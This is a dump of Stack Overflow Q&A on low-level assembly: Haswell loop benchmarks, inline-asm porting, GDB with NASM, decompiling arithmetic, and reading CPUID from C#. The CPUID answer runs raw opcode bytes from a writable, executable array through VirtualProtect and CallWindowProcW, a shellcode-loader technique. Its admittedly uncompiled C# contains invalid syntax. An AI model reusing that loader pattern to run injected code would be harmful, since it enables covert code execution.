12ASJ: 48.59%      64.48%      48.74%      49.69%      48.75%      49.69%      48.99%      48.60%
1A2SJ: 49.69%      64.77%      48.67%      64.06%      49.69%      49.69%      48.94%      49.69%
1AS2J: 48.61%      64.66%      48.73%      49.71%      48.77%      49.69%      49.05%      48.74%
1S2AJ: 49.66%      65.13%      49.49%      49.66%      48.96%      64.82%      49.02%      49.66%
1SA2J: 64.44%      64.69%      49.69%      64.34%      49.69%      64.41%      48.75%      64.14%
21SAJ: 65.33%*     65.34%      49.70%      65.06%      49.62%      65.07%      49.22%      65.04%
21ASJ: Hypothetically =12ASJ
2A1SJ: Hypothetically =1A2SJ
2AS1J: Hypothetically =1AS2J
2S1AJ: Hypothetically =1S2AJ
2SA1J: Hypothetically =1SA2J
S21AJ: 48.91%      65.19%      49.04%      49.72%      49.12%      49.63%      49.21%      48.95%
S2A1J: Hypothetically =S1A2J
SA21J: Hypothetically =SA12J
SA12J: 64.69%      64.93%      49.70%      64.66%      49.69%      64.27%      48.71%      64.56%
S12AJ: 48.90%      65.20%      49.12%      49.63%      49.03%      49.70%      49.21%*     48.94%
S1A2J: 49.69%      64.74%      48.65%      64.48%      49.43%      49.69%      48.66%      49.69%
A2S1J: Hypothetically =A1S2J
A21SJ: Hypothetically =A12SJ
A12SJ: 64.62%      64.45%      49.69%      64.57%      49.69%      64.45%      48.58%      63.99%
A1S2J: 49.72%      64.69%      49.72%      49.72%      48.67%      64.46%      48.95%      49.72%
AS21J: Hypothetically =AS21J
AS12J: 48.71%      64.53%      48.76%      49.69%      48.76%      49.74%      48.93%      48.69%
</code></pre>

<p>We can notice a few things from the table:</p>

<ul>
<li>Several plateaux of results, but two main ones only: Just under 50% and around 65%.</li>
<li>L1 and L2 can permute freely between each other without affecting the result.</li>
<li>Offsetting the accesses by -32 bytes <em>can</em> change efficiency.</li>
<li>The patterns we are interested in (Load 1, Load 2, Store 1 and Jump with the Add anywhere around them and the -32 offsets properly applied) are all the same, and all in the higher plateau:
<ul>
<li><code>12SAJ</code> Case 0 (No offsets applied), with efficiency 65.34% (the highest)</li>
<li><code>12ASJ</code> Case 1 (<code>S-32</code>), with efficiency 64.48%</li>
<li><code>1A2SJ</code> Case 3 (<code>2L-32</code>, <code>S-32</code>), with efficiency 64.06%</li>
<li><code>A12SJ</code> Case 7 (<code>1L-32</code>, <code>2L-32</code>, <code>S-32</code>), with efficiency 63.99%</li>
</ul></li>
<li>There always exists at least one ""case"" for every permutation that allows execution at the higher plateau of efficiency. In particular, Case 1 (where <code>S-32</code>) seems to guarantee this.</li>
<li>Cases 2, 4 and 6 guarantee execution at the lower plateau. They have in common that either or both of the loads are offset by -32 while the store isn't.</li>
<li>For cases 0, 3, 5 and 7, it depends on the permutation.</li>
</ul>

<p>Whence we may draw at least a few conclusions:</p>

<ul>
<li>Execution ports 2 and 3 really don't care which load address they generate and load from.</li>
<li>Macro-op fusion of the <code>add</code> and <code>jmp</code> appears unimpacted by any permutation of the instructions (in particular under Case 1 offsetting), leading me to believe that @Evgeny Kluev's conclusion is incorrect: The distance of the <code>add</code> from the <code>jne</code> does <em>not</em> appear to impact their fusion. I'm reasonably certain now that the Haswell ROB handles this correctly.
<ul>
<li>What Evgeny was seeing (Going from <code>12SAJ</code> with efficiency 65% to the others with efficiency 49% within Case 0) was an effect due solely to the value of the addresses loaded and stored from, and not due to an inability of the core to macro-fuse the add and branch.</li>
<li>Further, macro-op fusion must be occurring <em>at least some of the time</em>, since the average loop time is 1.5 CC. If macro-op fusion did not occur this would be 2CC minimum.</li>
</ul></li>
<li>Having tested all valid and invalid permutations of instructions within the not-unrolled loop, we've seen nothing higher than 65.34%. This answers empirically with a ""no"" the question of whether it is possible to use the full bandwidth without unrolling.</li>
</ul>

<p>I will hypothesize several possible explanations:</p>

<ul>
<li>We're seeing some wierd perversion due to the value of the addresses relative to each other.
<ul>
<li>If so then there would exist a set of offsets of <code>x</code>, <code>y</code> and <code>z</code> that would allow maximum throughput. Quick random tests on my part seem not to support this.</li>
</ul></li>
<li><p>We're seeing the loop run in one-two-step mode; The loop iterations alternate running in one clock cycle, then two.</p>

<ul>
<li><p>This could be macro-op fusion being affected by the decoders. From Agner Fog:</p>

<p><em>Fuseable arithmetic/logic instructions cannot be decoded in the last of the four decoders on Sandy Bridge and Ivy Bridge processors. I have not tested whether this also applies to the Haswell.</em></p></li>
<li>Alternately, every other clock cycle an instruction is issued to the ""wrong"" port, blocking the next iteration for one extra clock cycle. Such a situation would be self-correcting in the next clock cycle but would remain oscillatory.
<ul>
<li>If somebody has access to the Intel performance counters, he should look at the events <code>UOPS_EXECUTED_PORT.PORT_[0-7]</code>. If oscillation is not occuring, all ports that are used will be pegged equally during the relevant stretch of time; Else if oscillation is occuring, there will be a 50% split. Especially important is to look at the ports Mystical pointed out (0, 1, 6 and 7).</li>
</ul></li>
</ul></li>
</ul>

<p>And here's what I think is <em>not</em> happening:</p>

<ul>
<li>I don't believe that the fused arithmetic+branch uop is blocking execution by going to port 0, since predicted-taken branches are sent exclusively to port 6 (see Agner Fog's <em>Instruction Tables</em> under <code>Haswell -&gt; Control transfer instructions</code>). After a few iterations of the loop above, the branch predictor will learn that this branch is a loop and always predict as taken.</li>
</ul>

<p>I believe this is a problem that will be solved with Intel's performance counters.</p>
","25966091"
"Assembler error.: Bad instruction","6414","","<p>I've run into this error </p>

<pre><code>/tmp/ccK86fyk.s: Assembler messages:
/tmp/ccK86fyk.s:69: Error: bad instruction `sw $3,0(r3)'
/tmp/ccK86fyk.s:70: Error: bad instruction `sw $7,4(r3)'
</code></pre>

<p>( The rest of this long code is in this paste.: <a href=""http://pastebin.com/6YRx8rDh"" rel=""nofollow"">http://pastebin.com/6YRx8rDh</a> )</p>

<p>The CPU is an arm Cortex-A8 in a project built in maemo fremantle.</p>

<p>So well, I have little assembly knowledge, and I've been studying it and learning
a bit more about it, but I can't seem to understand this error.
I've also researched thoughout google for a few days now, and I can't find a concrete
answer to my problem.</p>

<p>This is the header that has the lines that results in errors.: <a href=""http://pastebin.com/k3D4cg0d"" rel=""nofollow"">http://pastebin.com/k3D4cg0d</a></p>

<p>( Provided more informations on a comment, since I cannot post more than 2 links )</p>
","<p>SW and LW are opcode for MIPS architecture (Load word et Store Word).
You can't use this Assembly code with a Cortex A8.</p>

<p>PS: Sorry, I previously said that it was Aarch64 instruction. I was wrong...</p>
","8490136"
"Converting problem: __asm__ __volatile__","6402","","<p>I have been dealing with Nasm on a linux environment for some time and this function worked great... but now I am switching to a windows environment and I want to use Masm (with VS2008) I cant seem to get this to work...</p>

<pre><code>void outportb (unsigned short _port, unsigned short _data)
{
  __asm__ __volatile__ (""outb %1, %0"" : : ""dN"" (_port), ""a"" (_data));
}
</code></pre>

<p>When I write something like this...</p>

<pre><code>void outportb (unsigned short _port, unsigned short _data)
{
  asm volatile (""outb %1, %0"" : : ""dN"" (_port), ""a"" (_data));
}
</code></pre>

<p>asm is no more recognised and volatile throws an error saying ""string"", I also tried writing  _asm volatile but I get an error saying ""inline assembler syntax error in 'opcode'; found 'data type'""</p>
","<p>Assuming you're talking about x86 command set, here are few things to remember:</p>

<ol>
<li>the instruction ""outb"" outputs one byte, which would be equivalent to type ""char"" or ""unsigned char"" in C/C++.  For outputting a 16-bit (since you're using ""unsigned short"") word one needs to use ""outw""</li>
<li>having said that, it is recommended by Intel (and required by VS) that you use the instruction mnemonic ""out"" and the port size is recognized from the operand size.  For example ""out dx, <strong>ax</strong>"" would be equivalent for ""outw"", while ""out dx, <strong>al</strong>"" is equivalent for ""outb""</li>
<li>on x86 the ""out"" instruction requires the port and the outputting value to be placed into (e)dx and {eax/ax/al} registers respectively.  While Nasm might do it for you (I don't have the compiler handy, so I can't confirm that), in VS you have to do it the way it is done on the CPU level.</li>
<li>there is no reason to specify ""volatile"" keyword with __asm.  Any inline assembly instructions cause VS compiler to disable read caching (what volatile keyword is for)</li>
</ol>

<p>Here is the code (assuming you're writing into 16-bit port):</p>

<pre><code>void outportw(unsigned short port, unsigned short data)
{
    __asm  mov ax, data; 
    __asm  mov dx, port; 
    __asm  out dx, ax;
}
</code></pre>

<p>in case you're writing into 8-bit port, the code should look like that:</p>

<pre><code>void outportb(unsigned short port, unsigned char data)
{
    __asm  mov al, data; 
    __asm  mov dx, port; 
    __asm  out dx, al;
}
</code></pre>
","1385554"
"What is the fastest way to test if a double number is integer (in modern intel X86 processors)","6402","","<p>Our server application does a lot of integer tests in a hot code path, currently we use the following function:</p>

<pre><code>inline int IsInteger(double n)
{
    return n-floor(n) &lt; 1e-8
}
</code></pre>

<p>This function is very hot in our workload, so I want it to be as fast as possible. I also want to eliminate the ""floor"" library call if I can. Any suggestions?</p>
","<p>A while back <a href=""http://assemblyrequired.crashworks.org/why-you-should-never-cast-floats-to-ints/"" rel=""nofollow noreferrer"">I ran a bunch of timings on the most efficient way to convert between floats and integers, and wrote them up</a>. I also <a href=""http://assemblyrequired.crashworks.org/sse2-fastest-rounding-on-x86/"" rel=""nofollow noreferrer"">timed techniques for rounding</a>. </p>

<p>The short story for you is: converting from a float to an int, or using union hacks, is unlikely to be an improvement due to a CPU hazard called a load-hit-store -- <em>unless</em> the floats are coming from RAM and not a register. </p>

<p>Because it is an intrinsic, abs(floor(x)-eps) is probably the fastest solution. But because this is all very sensitive to the particular architecture of your CPU -- depending on very sensitive things like pipeline depth and store forwarding -- <em>you'll need to time a variety of solutions</em> to find one that is really optimal. </p>
","1944413"
"GDB complains No Source Available","6395","","<p>I'm running on Ubuntu 12.10 64bit.</p>

<p>I am trying to debug a simple assembly program in GDB. However GDB's gui mode (-tui) seems unable to find the source code of my assembly file. I've rebuilt the project in the currently directory and searched google to no avail, please help me out here.</p>

<p>My commands:</p>

<pre><code>nasm -f elf64 -g -F dwarf hello.asm

gcc -g hello.o -o hello

gdb -tui hello
</code></pre>

<p>Debug information seems to be loaded, I can set a breakpoint at main() but the top half the screen still says '<strong>[ No Source Available ]</strong>'.</p>

<p>Here is hello.asm if you're interested:</p>

<pre><code>;  hello.asm  a first program for nasm for Linux, Intel, gcc
;
; assemble: nasm -f elf -l hello.lst  hello.asm
; link:     gcc -o hello  hello.o
; run:          hello 
; output is:    Hello World 

    SECTION .data       ; data section
msg:    db ""Hello World"",10 ; the string to print, 10=cr
len:    equ $-msg       ; ""$"" means ""here""
                ; len is a value, not an address

    SECTION .text       ; code section
        global main     ; make label available to linker 
main:               ; standard  gcc  entry point

    mov edx,len     ; arg3, length of string to print
    mov ecx,msg     ; arg2, pointer to string
    mov ebx,1       ; arg1, where to write, screen
    mov eax,4       ; write command to int 80 hex
    int 0x80        ; interrupt 80 hex, call kernel

    mov ebx,0       ; exit code, 0=normal
    mov eax,1       ; exit command to kernel
    int 0x80        ; interrupt 80 hex, call kernel
</code></pre>
","<p>The problem in this case is that the assembler isn't producing line-number information for the debugger. So although the source is there (if you do ""list"" in gdb, it shows a listing of the source fiel - at least when I follow your steps, it does), but the debugger needs line-number information from the file to know what line corresponds to what address. It can't do that with the information given. </p>

<p>As far as I can find, there isn't a way to get NASM to issue the .loc directive that is used by <code>as</code> when using <code>gcc</code> for example. But <code>as</code> isn't able to take your source file without generating a gazillion errors [even with -msyntax=intel -mmnemonic=intel -- you woult think that shoudl work]. </p>

<p>So unless someome more clever can come up with a way to generate the .loc entries which gives the debugger line number information, I'm not entirely sure how we can answer your question in a way that you'll be happy with. </p>
","14030532"
"Reverse engineering C-source code from assembly","6387","","<p>I would like to know if anyone can help me out with a problem I am having when studying one of the lecture slides from an introductory assembly class that I am taking in school. The problem I am having is not understanding the assembly, it is how exactly the C source code is ordered based on the assembly. I will post the snippet I am talking about and maybe it will be clearer what I am talking about.</p>

<p>C Source given:</p>

<pre><code>int arith(int x, int y, int z)
{ 
   int t1 = x+y;
   int t2 = z+t1;
   int t3 = x+4;
   int t4 = y * 48; 
   int t5 = t3 + t4;
   int rval = t2 * t5;
   return rval;
}
</code></pre>

<p>Assembly given:</p>

<pre><code>arith:
pushl %ebp
movl %esp,%ebp

movl 8(%ebp),%eax
movl 12(%ebp),%edx
leal (%edx,%eax),%ecx
leal (%edx,%edx,2),%edx
sall $4,%edx
addl 16(%ebp),%ecx
leal 4(%edx,%eax),%eax
imull %ecx,%eax

movl %ebp,%esp
popl %ebp
ret
</code></pre>

<p>I am just confused as to how I am supposed to be able to discern for example that the adding of <code>z + t1</code> (<code>z + x + y</code>) is listed on the second line(in the source) when in the assembly it comes after the <code>y * 48</code> in the assembly code or for example that <code>x + 4</code> is the 3rd line when in the assembly it is not even in a line by itself, its sort of mixed in with the last <code>leal</code> statement.  It makes sense to me when I have the source but I am supposed to be able to reproduce the source for a test and I do understand that the compiler optimizes things but if anyone has a way of thinking about the reverse engineering that could help me out I would greatly appreciate it if they could walk me through their thought process.</p>

<p>Thanks.</p>
","<p>I've broken down the disassembly for you to show how the assembly was produced from the C source.</p>

<p><code>8(%ebp)</code> = <code>x</code>, <code>12(%ebp)</code> = <code>y</code>, <code>16(%ebp)</code> = <code>z</code></p>

<pre><code>arith:
</code></pre>

<p>Create the stack frame:</p>

<pre><code>pushl %ebp
movl %esp,%ebp
</code></pre>

<p><hr/>
Move <code>x</code> into <code>eax</code>, <code>y</code> into <code>edx</code>:</p>

<pre><code>movl 8(%ebp),%eax
movl 12(%ebp),%edx
</code></pre>

<p><hr/>
<strong><code>t1 = x + y</code></strong>. <code>leal</code> (Load effective address) will add <code>edx</code> and <code>eax</code>, and <code>t1</code> will be  in <code>ecx</code>:</p>

<pre><code>leal (%edx,%eax),%ecx
</code></pre>

<p><hr/>
<strong><code>int t4 = y * 48;</code></strong> in two steps below, multiply by 3, then by 16. <code>t4</code> will eventually be in <code>edx</code>:</p>

<p>Multiply <code>edx</code> by 2, and add <code>edx</code> to the result, ie. <code>edx = edx * 3</code>:</p>

<pre><code>leal (%edx,%edx,2),%edx
</code></pre>

<p>Shift left 4 bits, ie. multiply by 16:</p>

<pre><code>sall $4,%edx
</code></pre>

<p><hr/>
<strong><code>int t2 = z+t1;</code></strong>. <code>ecx</code> <em>initially</em> holds <code>t1</code>, <code>z</code> is at <code>16(%ebp)</code>, at the end of the instruction <code>ecx</code> will be holding <code>t2</code>:</p>

<pre><code>addl 16(%ebp),%ecx
</code></pre>

<p><hr/>
<strong><code>int t5 = t3 + t4;</code></strong>. <strong><code>t3</code></strong> was simply <code>x + 4</code>, and rather than calculating and storing <code>t3</code>, the expression of <code>t3</code> is placed inline. This instruction essential does <code>(x+4) + t4</code>, which is the same as <code>t3</code> + <code>t4</code>. It adds <code>edx</code> (<code>t4</code>) and <code>eax</code> (<code>x</code>), and adds 4 as an <em>offset</em> to achieve that result.</p>

<pre><code>leal 4(%edx,%eax),%eax
</code></pre>

<hr/>

<p><strong><code>int rval = t2 * t5;</code></strong> Fairly straight-forward this one; <code>ecx</code> represents <code>t2</code> and <code>eax</code> represents <code>t5</code>. The return value is passed back to the caller through <code>eax</code>.</p>

<pre><code>imull %ecx,%eax
</code></pre>

<p><hr/>
Destroy the stack frame and restore <code>esp</code> and <code>ebp</code>:</p>

<pre><code>movl %ebp,%esp
popl %ebp
</code></pre>

<p><hr/>
Return from the routine:</p>

<pre><code>ret
</code></pre>

<p><hr/>
From this example you can see that the result is the same, but the structure is a bit different. Most likely this code was compiled with some sort of optimization or someone wrote it themself like that to demonstrate a point.</p>

<p>As others have said, you can't go exactly back to the source from the disassembly. It's up to the interpretation of the person reading the assembly to come up with equivalent C code.</p>

<p><hr/>
To help with learning assembly and understanding the disassembly of your C programs, you can do the following on Linux:</p>

<p>Compile with debug information (<code>-g</code>), which will embed the source:</p>

<pre><code>gcc -c -g arith.c
</code></pre>

<p>If you're on a 64-bit machine, you can tell the compiler to create a 32-bit binary with the <code>-m32</code> flag (I did so for the example below).</p>

<p><br/>
Use <em>objdump</em> to dump the object file with it's source interleaved:</p>

<pre><code>objdump -d -S arith.o
</code></pre>

<p><code>-d</code> = disassembly, <code>-S</code> = display source. You can add <code>-M intel-mnemonic</code> to use the Intel ASM syntax if you prefer that over the AT&amp;T syntax that your example uses.</p>

<p>Output:</p>

<pre><code>arith.o:     file format elf32-i386


Disassembly of section .text:

00000000 &lt;arith&gt;:
int arith(int x, int y, int z)
{ 
   0:   55                      push   %ebp
   1:   89 e5                   mov    %esp,%ebp
   3:   83 ec 20                sub    $0x20,%esp
   int t1 = x+y;
   6:   8b 45 0c                mov    0xc(%ebp),%eax
   9:   8b 55 08                mov    0x8(%ebp),%edx
   c:   01 d0                   add    %edx,%eax
   e:   89 45 fc                mov    %eax,-0x4(%ebp)
   int t2 = z+t1;
  11:   8b 45 fc                mov    -0x4(%ebp),%eax
  14:   8b 55 10                mov    0x10(%ebp),%edx
  17:   01 d0                   add    %edx,%eax
  19:   89 45 f8                mov    %eax,-0x8(%ebp)
   int t3 = x+4;
  1c:   8b 45 08                mov    0x8(%ebp),%eax
  1f:   83 c0 04                add    $0x4,%eax
  22:   89 45 f4                mov    %eax,-0xc(%ebp)
   int t4 = y * 48; 
  25:   8b 55 0c                mov    0xc(%ebp),%edx
  28:   89 d0                   mov    %edx,%eax
  2a:   01 c0                   add    %eax,%eax
  2c:   01 d0                   add    %edx,%eax
  2e:   c1 e0 04                shl    $0x4,%eax
  31:   89 45 f0                mov    %eax,-0x10(%ebp)
   int t5 = t3 + t4;
  34:   8b 45 f0                mov    -0x10(%ebp),%eax
  37:   8b 55 f4                mov    -0xc(%ebp),%edx
  3a:   01 d0                   add    %edx,%eax
  3c:   89 45 ec                mov    %eax,-0x14(%ebp)
   int rval = t2 * t5;
  3f:   8b 45 f8                mov    -0x8(%ebp),%eax
  42:   0f af 45 ec             imul   -0x14(%ebp),%eax
  46:   89 45 e8                mov    %eax,-0x18(%ebp)
   return rval;
  49:   8b 45 e8                mov    -0x18(%ebp),%eax
}
  4c:   c9                      leave  
  4d:   c3                      ret
</code></pre>

<p>As you can see, without optimizations the compiler produces a larger binary than the example you have. You can play around with that and add a compiler optimization flag when compiling (ie. <code>-O1</code>, <code>-O2</code>, <code>-O3</code>). The higher the optimization level, the more abstract the disassembly's going to seem.</p>

<p>For example, with just level 1 optimization (<code>gcc -c -g -O1 -m32 arith.c1</code>), the assembly code produced is a lot shorter:</p>

<pre><code>00000000 &lt;arith&gt;:
int arith(int x, int y, int z)
{ 
   0:   8b 4c 24 04             mov    0x4(%esp),%ecx
   4:   8b 54 24 08             mov    0x8(%esp),%edx
   int t1 = x+y;
   8:   8d 04 11                lea    (%ecx,%edx,1),%eax
   int t2 = z+t1;
   b:   03 44 24 0c             add    0xc(%esp),%eax
   int t3 = x+4;
   int t4 = y * 48; 
   f:   8d 14 52                lea    (%edx,%edx,2),%edx
  12:   c1 e2 04                shl    $0x4,%edx
   int t5 = t3 + t4;
  15:   8d 54 11 04             lea    0x4(%ecx,%edx,1),%edx
   int rval = t2 * t5;
  19:   0f af c2                imul   %edx,%eax
   return rval;
}
  1c:   c3                      ret
</code></pre>
","8115134"
"How do modern compilers use mmx/3dnow/sse instructions?","6375","","<p>I've been reading up on the x86 instruction set extensions, and they only seem useful in some quite specific circumstances (eg HADDPD - (Horizontal-Add-Packed-Double) in SSE3). These require a certain register layout that needs to be either deliberately set up, or occur from the series of instructions before it. How often do general-purpose compilers like gcc actually use these instructions (or a subset thereof), or are they mainly to be used in hand-coded assembler? How does the compiler detect where it is appropriate to use SIMD instructions?</p>
","<p>Generally, few compilers use them. GCC and Visual Studio arn't usually able to use the SIMD instructions. If you enable SSE as a compiler flag, it will use the scalar SSE instructions for regular floating-point operations, but generally, don't expect the vectorized ones to be used automatically. Recent versions of GCC might be able to use them in some cases, but didn't work last I tried. Intel's C++ compiler is the only big compiler I know of that is able to auto-vectorize some loops.</p>

<p>In general though, you'll have to use them yourself. Either in raw assembler, or by using compiler intrinsics. In general, I'd say intrinsics are the better approach, since they better allow the compiler to understand the code, and so schedule and optimize, but in practice, I know MSVC at least doesn't always generate very efficient code from intrinsics, so plain asm may be the best solution there. Experiment, see what works. But don't expect the compiler to use these instructions for you, unless you 1) use the right compiler, and 2) write fairly simple loops that can be trivially vectorized.</p>

<p><strong>Update 2012</strong><br>
Ok, so three years have passed since I wrote this answer. GCC has been able to auto-vectorize (simple) code for a couple of years now, and in VS2012, MSVC <em>finally</em> gains the same capability. Of course, the main part of my answer still applies: compilers can still only vectorize fairly trivial code. For anything more complex, you're stuck fiddling with intrinsics or inline asm.</p>
","875807"
"Inline Assembly Code to Get CPU ID","6367","","<p>I found a nice piece of code <a href=""http://social.msdn.microsoft.com/Forums/it-IT/visualcsharpit/thread/8a8bdaf0-19ee-4563-9d95-dc8f8069ca83/"" rel=""nofollow"">here</a> that executes ASM instructions using API calls in order to obtain the serial number of the CPU:</p>

<pre><code>using System;
using System.Text;
using System.Runtime.InteropServices;

namespace ConsoleApplication1
{
    class Program
    {
        [DllImport(""user32"", EntryPoint = ""CallWindowProcW"", CharSet = CharSet.Unicode, SetLastError = true, ExactSpelling = true)]         private static extern IntPtr ExecuteNativeCode([In] byte[] bytes, IntPtr hWnd, int msg, [In, Out] byte[] wParam, IntPtr lParam);

        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport(""kernel32"", CharSet = CharSet.Unicode, SetLastError = true)]         public static extern bool VirtualProtect([In] byte[] bytes, IntPtr size, int newProtect, out int oldProtect);

        const int PAGE_EXECUTE_READWRITE = 0x40;

        static void Main(string[] args)
        {
            string s = CPU32_SerialNumber();
            Console.WriteLine(""CPU Serial-Number: "" + s);
            Console.ReadLine();
        }

        private static string CPU32_SerialNumber()
        {
            byte[] sn = new byte[12];

            if (!ExecuteCode32(ref sn))
                return ""ND"";

            return string.Format(""{0}{1}{2}"", BitConverter.ToUInt32(sn, 0).ToString(""X""), BitConverter.ToUInt32(sn, 4).ToString(""X""), BitConverter.ToUInt32(sn, 8).ToString(""X""));
        }

        private static bool ExecuteCode32(ref byte[] result)
        {
            // CPU 32bit SerialNumber -&gt; asm x86 from c# (c) 2003-2011 Cantelmo Software
            // 55               PUSH EBP
            // 8BEC             MOV EBP,ESP
            // 8B7D 10          MOV EDI,DWORD PTR SS:[EBP+10]
            // 6A 02            PUSH 2
            // 58               POP EAX
            // 0FA2             CPUID
            // 891F             MOV DWORD PTR DS:[EDI],EBX
            // 894F 04          MOV DWORD PTR DS:[EDI+4],ECX
            // 8957 08          MOV DWORD PTR DS:[EDI+8],EDX
            // 8BE5             MOV ESP,EBP
            // 5D               POP EBP
            // C2 1000          RETN 10

            int num;

            byte[] code_32bit = new byte[] { 0x55, 0x8b, 0xec, 0x8b, 0x7d, 0x10, 0x6a, 2, 0x58, 15, 0xa2, 0x89, 0x1f, 0x89, 0x4f, 4, 0x89, 0x57, 8, 0x8b, 0xe5, 0x5d, 0xc2, 0x10, 0 };
            IntPtr ptr = new IntPtr(code_32bit.Length);

            if (!VirtualProtect(code_32bit, ptr, PAGE_EXECUTE_READWRITE, out num))
                Marshal.ThrowExceptionForHR(Marshal.GetHRForLastWin32Error());

            ptr = new IntPtr(result.Length);

            return (ExecuteNativeCode(code_32bit, IntPtr.Zero, 0, result, ptr) != IntPtr.Zero);
        }
    }
}
</code></pre>

<p>I tested it and it's working fine for me. But I still have some questions and problems related to it:</p>

<p>1) I would like to implement this code inside an application that can run in both x86 and x64 environment. If I run this code into a 64x environment, I get an AccessViolationException. The author of the code said that this can be easily achieved implementing also a bytecode array that contains x64 instructions (RAX, RBX, RCX, RDX, ...). My problem is that I absolutely don't know how to convert 86x byte code into x64 byte code, I don't even know ASM in fact. Is there any conversion table or utility that can do this?</p>

<p>2) Is this code snippet valid for any type of processor? I tested it on my laptop that uses an Intel core and it works... but what about AMD for example?</p>

<p>3) I'm not sure that the value I'm obtaining is the correct one. If I run the following code:</p>

<pre><code>string cpuInfo = String.Empty;

System.Management.ManagementClass mc = new System.Management.ManagementClass(""Win32_Processor"");
System.Management.ManagementObjectCollection moc = mc.GetInstances();

foreach (System.Management.ManagementObject mo in moc)
{
    if (cpuInfo == String.Empty)
        cpuInfo = mo.Properties[""ProcessorId""].Value.ToString();
}
</code></pre>

<p>The result I get is ""BFEBFBFF000306A9"". The result of the code snippet is ""F0B2FF0CA0000"". Why? Which one is correct?</p>
","<p>Here's your code modified to get the same result as <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa394373%28v=vs.85%29.aspx"" rel=""noreferrer"">Win32_Processor.ProcessorId</a> on both x64 <em>and</em> x86:</p>

<pre><code>using System;
using System.Text;
using System.Runtime.InteropServices;

namespace ConsoleApplication1
{
    class Program
    {
        [DllImport(""user32"", EntryPoint = ""CallWindowProcW"", CharSet = CharSet.Unicode, SetLastError = true, ExactSpelling = true)]         private static extern IntPtr CallWindowProcW([In] byte[] bytes, IntPtr hWnd, int msg, [In, Out] byte[] wParam, IntPtr lParam);

        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport(""kernel32"", CharSet = CharSet.Unicode, SetLastError = true)]         public static extern bool VirtualProtect([In] byte[] bytes, IntPtr size, int newProtect, out int oldProtect);

        const int PAGE_EXECUTE_READWRITE = 0x40;

        static void Main(string[] args)
        {
            string s = ProcessorId();
            Console.WriteLine(""ProcessorId: "" + s);
            Console.ReadLine();
        }

        private static string ProcessorId()
        {
            byte[] sn = new byte[8];

            if (!ExecuteCode(ref sn))
                return ""ND"";

            return string.Format(""{0}{1}"", BitConverter.ToUInt32(sn, 4).ToString(""X8""), BitConverter.ToUInt32(sn, 0).ToString(""X8""));
        }

        private static bool ExecuteCode(ref byte[] result)
        {
            int num;

            /* The opcodes below implement a C function with the signature:
             * __stdcall CpuIdWindowProc(hWnd, Msg, wParam, lParam);
             * with wParam interpreted as a pointer pointing to an 8 byte unsigned character buffer.
             * */

            byte[] code_x86 = new byte[] {
                0x55,                      /* push ebp */
                0x89, 0xe5,                /* mov  ebp, esp */
                0x57,                      /* push edi */
                0x8b, 0x7d, 0x10,          /* mov  edi, [ebp+0x10] */
                0x6a, 0x01,                /* push 0x1 */
                0x58,                      /* pop  eax */
                0x53,                      /* push ebx */
                0x0f, 0xa2,                /* cpuid    */
                0x89, 0x07,                /* mov  [edi], eax */
                0x89, 0x57, 0x04,          /* mov  [edi+0x4], edx */
                0x5b,                      /* pop  ebx */
                0x5f,                      /* pop  edi */
                0x89, 0xec,                /* mov  esp, ebp */
                0x5d,                      /* pop  ebp */
                0xc2, 0x10, 0x00,          /* ret  0x10 */
            };
            byte[] code_x64 = new byte[] {
                0x53,                                     /* push rbx */
                0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, /* mov rax, 0x1 */
                0x0f, 0xa2,                               /* cpuid */
                0x41, 0x89, 0x00,                         /* mov [r8], eax */
                0x41, 0x89, 0x50, 0x04,                   /* mov [r8+0x4], edx */
                0x5b,                                     /* pop rbx */
                0xc3,                                     /* ret */
            };

            ref byte[] code;

            if (IsX64Process())
                code = ref code_x64;
            else 
                code = ref code_x86;

            IntPtr ptr = new IntPtr(code.Length);

            if (!VirtualProtect(code, ptr, PAGE_EXECUTE_READWRITE, out num))
                Marshal.ThrowExceptionForHR(Marshal.GetHRForLastWin32Error());

            ptr = new IntPtr(result.Length);

            return (CallWindowProcW(code, IntPtr.Zero, 0, result, ptr) != IntPtr.Zero);
        }

        private static bool IsX64Process() 
        {
            return IntPtr.Size == 8;
        }
    }
}
</code></pre>

<p>I made trivial modifications to the C# part without compiling the code (I don't have a Windows dev machine setup at the moment) so if there are syntax errors please just make the obvious fix.</p>

<p>I want to stress one very important point: <strong>what your original code was reading back was <em>NOT</em> a CPU serial number</strong>:</p>

<ul>
<li>You used CPUID function 2 (by placing 2 in <strong>EAX</strong> before executing the <strong>CPUID</strong> instruction). If you read the <a href=""http://www.intel.com/Assets/PDF/appnote/241618.pdf"" rel=""noreferrer"">Intel</a> and <a href=""http://support.amd.com/us/Embedded_TechDocs/25481.pdf"" rel=""noreferrer"">AMD</a> CPUID application notes you'll see that this reads back the cache and TLB hardware configuration and is only supported on Intel.</li>
<li>I modified your code to use CPUID function 1, which reads back the stepping, model, and family of a CPU. This matches the behavior of <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa394373%28v=vs.85%29.aspx"" rel=""noreferrer"">WIN32_Processor.ProcessorID</a></li>
<li>Modern x86 CPUs don't have a serial number that is unique among otherwise identical units ""rolling off the assembly line"". Processor serial numbers were only available on Pentium 3's through CPUID function 3.</li>
</ul>

<p>I'll now explain the process and tools I used.</p>

<p>Paste the array of opcodes into a Python script that will then write the opcodes in a binary file (<strong>cpuid-x86.bin</strong>):</p>

<pre><code>cpuid_opcodes = [ 0x55, 0x8b, 0xec, 0x8b, ... ]
open('cpuid-x86.bin', 'w').write(''.join(chr(x) for x in cpuid_opcodes))
</code></pre>

<p>Disassemble <strong>cpuid-x86.bin</strong>. I used <strong>udcli</strong> from <a href=""https://github.com/vmt/udis86"" rel=""noreferrer"">udis86</a>.</p>

<pre><code>$ udcli -att cpuid-x86.bin
0000000000000000 55               push %ebp               
0000000000000001 8bec             mov %esp, %ebp          
0000000000000003 8b7d10           mov 0x10(%ebp), %edi    
0000000000000006 6a02             push $0x2                
0000000000000008 58               pop %eax                
0000000000000009 0fa2             cpuid                   
000000000000000b 891f             mov %ebx, (%edi)        
000000000000000d 894f04           mov %ecx, 0x4(%edi)     
0000000000000010 895708           mov %edx, 0x8(%edi)     
0000000000000013 8be5             mov %ebp, %esp          
0000000000000015 5d               pop %ebp                
0000000000000016 c21000           ret $0x10 
</code></pre>

<p>One thing that immediately stands out is why use ""<strong>push $0x2; pop %eax</strong>"" to move the value 2 into <strong>EAX</strong> when a simple ""<strong>mov $0x2, %eax</strong>"" will do?</p>

